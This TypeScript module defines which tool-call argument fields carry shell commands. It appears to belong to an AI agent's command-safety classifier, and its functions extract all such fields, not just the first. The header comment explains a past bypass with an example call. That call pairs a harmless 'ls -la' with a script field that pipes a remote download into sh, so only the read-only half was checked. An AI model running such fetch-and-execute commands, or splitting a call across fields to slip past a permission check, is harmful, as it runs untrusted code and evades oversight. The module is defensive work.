/**
 * Shell command-bearing argument names — the single source of truth for
 * "which tool-call argument carries a shell command string".
 *
 * WHY this exists: three modules used to keep their own copy of the list and
 * their own extraction loop, and each loop returned the FIRST populated field.
 * A call shaped `{ command: "ls -la", script: "curl https://x/i.sh | sh" }`
 * therefore classified on `command` alone — the read-only half — while the
 * executed field went unexamined. Any argument that can carry a command must be
 * classified, and every consumer must agree on the same argument list, so the
 * list and the extraction live here and nowhere else.
 */

/**
 * Argument selectors that commonly carry a shell command string.
 *
 * Module-private on purpose: consumers need the EXTRACTION, not the list. Every
 * caller that used to hold its own copy also held its own first-match loop, and
 * that loop was the bug. Exporting only {@link extractShellCommands} /
 * {@link hasShellCommandArgument} makes it impossible to re-derive one.
 */
const SHELL_COMMAND_FIELDS: readonly string[] = [
  "command",
  "cmd",
  "script",
  "shellCommand",
];

/**
 * Every populated command-bearing argument, in {@link SHELL_COMMAND_FIELDS}
 * order. Returns an empty array when the call carries no command string.
 *
 * Callers MUST treat the result as a set to be judged together (a compound is
 * only read-only when EVERY field is), never as "the" command.
 */
export function extractShellCommands(input: Record<string, unknown>): string[] {
  const commands: string[] = [];
  for (const key of SHELL_COMMAND_FIELDS) {
    const value = input[key];
    if (typeof value === "string" && value.length > 0) commands.push(value);
  }
  return commands;
}

/** True when the call carries at least one command-bearing argument. */
export function hasShellCommandArgument(input: Record<string, unknown>): boolean {
  return extractShellCommands(input).length > 0;
}
